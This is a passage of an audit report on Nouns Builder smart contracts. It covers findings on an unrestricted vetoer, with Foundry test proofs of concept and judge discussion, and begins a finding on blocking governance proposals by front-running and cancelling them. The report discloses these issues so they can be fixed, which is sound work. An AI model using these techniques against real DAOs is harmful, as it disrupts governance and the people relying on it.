{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        } catch  {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             _pause();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/240#issuecomment-1253769910\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Any revert caused by minting will not be captured.</p>\n<p>This means that in the case of a erroneous mint the contract will be effectively bricked (and not paused).</p>\n<p>I have considered higher severity, but in lack of clear conditions for revert, I think Medium is appropriate.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/240\">iainnash (Nouns Builder) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-13-compromised-or-malicious-vetoer-can-veto-any-proposals-with-unrestricted-power\" style=\"position:relative;\"><a href=\"#m-13-compromised-or-malicious-vetoer-can-veto-any-proposals-with-unrestricted-power\" aria-label=\"m 13 compromised or malicious vetoer can veto any proposals with unrestricted power permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/622\">[M-13] Compromised or malicious vetoer can veto any proposals with unrestricted power</a></h2>\n<p><em>Submitted by rbserver, also found by ayeslick and rvierdiiev</em></p>\n<p>The <code>settings.vetoer</code>, which is the first founder defined by the <code>FounderParams</code>, can call the following <code>veto</code> function to veto any proposals that are not yet executed, which immediately blocks these proposals from execution. Because the vetoer is just one founder, which can just be a single EOA, the chance of losing its private key and being compromised is not low. There is also no guarantee that the vetoer will not become malicious in the future. When the vetoer becomes compromised or malicious, all critical proposals, such as for updating implementations or withdrawing funds from the treasury, can be vetoed so the negative impact can be very high.</p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L385-L405\">https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L385-L405</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"54\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">veto</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_proposalId</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Ensure the caller is the vetoer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">settings</span><span class=\"mtk1\">.</span><span class=\"mtk12\">vetoer</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ONLY_VETOER</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Ensure the proposal has not been executed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">state</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_proposalId</span><span class=\"mtk1\">) == </span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Executed</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">PROPOSAL_ALREADY_EXECUTED</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Get the pointer to the proposal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Proposal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">proposals</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_proposalId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Update the proposal as vetoed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">vetoed</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// If the proposal was queued:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">settings</span><span class=\"mtk1\">.</span><span class=\"mtk12\">treasury</span><span class=\"mtk1\">.</span><span class=\"mtk11\">isQueued</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_proposalId</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Cancel the proposal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">settings</span><span class=\"mtk1\">.</span><span class=\"mtk12\">treasury</span><span class=\"mtk1\">.</span><span class=\"mtk11\">cancel</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_proposalId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ProposalVetoed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_proposalId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"proof-of-concept-15\" style=\"position:relative;\"><a href=\"#proof-of-concept-15\" aria-label=\"proof of concept 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Please append the following tests in <code>test\\Gov.t.sol</code>. These tests will pass to demonstrate the vetoer’s power for vetoing pending, active, and queued proposals.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"55\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_VetoPendingProposal</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">createProposal</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">state</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">)), </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Pending</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// vetoer can veto a pending proposal without a delay</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">founder</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">veto</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk11\">uint8</span><span class=\"mtk1\">(</span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">state</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">)), </span><span class=\"mtk11\">uint8</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Vetoed</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"56\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_VetoActiveProposal</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">mintVoter1</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">createProposal</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votingDelay</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">votingDelay</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">votingDelay</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">state</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">)), </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Active</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// vetoer can veto an active proposal without a delay</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">founder</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">veto</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk11\">uint8</span><span class=\"mtk1\">(</span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">state</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">)), </span><span class=\"mtk11\">uint8</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Vetoed</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"57\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_VetoQueuedProposal</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">mintVoter1</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">createProposal</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">votingDelay</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">state</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">)), </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Active</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">castVote</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">votingPeriod</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">state</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">)), </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Succeeded</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">queue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">state</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">)), </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Queued</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// vetoer can veto a queued proposal without a delay</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">founder</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">veto</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk11\">uint8</span><span class=\"mtk1\">(</span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">state</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">)), </span><span class=\"mtk11\">uint8</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Vetoed</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"tools-used-4\" style=\"position:relative;\"><a href=\"#tools-used-4\" aria-label=\"tools used 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-17\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-17\" aria-label=\"recommended mitigation steps 17 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>A token supply threshold governance configuration can be added. Before the token supply exceeds this threshold, the vetoer can remain in full power for protecting against the 51% attack on the deployed DAO while the token supply is low.</p>\n<p>After the token supply exceeds this threshold, the following changes can be considered for restricting the vetoer’s power.</p>\n<ol>\n<li>The vetoer is only allowed to veto a proposal during a defined period after the voting is done. The proposal is not allowed to be executed during this period.</li>\n<li>The vetoer is only allowed to veto the passed proposal when the number of support and against votes are very close or the number of support votes is much higher than the against votes.</li>\n</ol>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/622#issuecomment-1258591799\">tbtstl (Nouns Builder) disputed and commented</a>:</strong></p>\n<blockquote>\n<p>The intention of the vetoer is to ensure they can veto. This is by design.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/622#issuecomment-1258871521\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I believe that in the spirit of transparency, because the 51% without Vetoer is a valid attack, then the idea the Vetoer can be the weak link also has to be entertained.</p>\n<p>While we would all agree that there are ways to mitigate this, such as using a fairly strong multisig with members of other projects, we would also agree concede that the Vetoer would still be the last piece before decentralization.</p>\n<p>In that sense, an early project does carry further risk because of the Vetoer, and while a Vetoer itself is not inherently good nor bad, the Vetoer itself could create opportunities for sophisticated attacks.</p>\n<p>Other reports spoke about bribing voters, or pure 51% attacks, and all of these are contingent on the Vetoer being unable to react / defend the protocol at the right time.</p>\n<p>So, if we agree that the lack of Vetoer is a vulnerability we must also agree that the presence of a tyrannical Vetoer is a vulnerability as well.</p>\n<p>In that sense we must admit that Governance itself can create further problems and risks and perhaps issuing enough tokens to allow the burning of the Vetoer is the first step towards a more decentralized Project.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/622\">tbtstl (Nouns Builder) acknowledged</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/622#issuecomment-1265693365\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Because Code4rena is a user facing Project, where our reports can be used to persuade end-users that the protocols are safe, per the logic detailed above, the finding is valid and of Medium Severity per our rules.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-14-creating-a-new-governance-proposal-can-be-prevented-by-anyone\" style=\"position:relative;\"><a href=\"#m-14-creating-a-new-governance-proposal-can-be-prevented-by-anyone\" aria-label=\"m 14 creating a new governance proposal can be prevented by anyone permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/182\">[M-14] Creating a new governance proposal can be prevented by anyone</a></h2>\n<p><em>Submitted by berndartmueller, also found by CertoraInc, m9800, and scaraven</em></p>\n<p>When creating a new governance proposal, the <code>proposalId</code> is generated by hashing the proposal data (<code>_targets, _values, _calldatas, descriptionHash</code>). To prevent duplicated proposals, the current <code>Governor</code> implementation checks if the <code>proposalId</code> exists already. If it exists, the call will revert with the <code>PROPOSAL_EXISTS</code> error.</p>\n<h3 id=\"impact-5\" style=\"position:relative;\"><a href=\"#impact-5\" aria-label=\"impact 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Anyone can prevent others from creating governance proposals by front-running the create proposal transaction with the same data, followed by an immediate call to the <code>Governor.cancel</code> function.</p>\n<p>This will prevent creating a proposal with the same proposal data. A proposal creator would have to slightly change the proposal to try to create it again (however, it can be 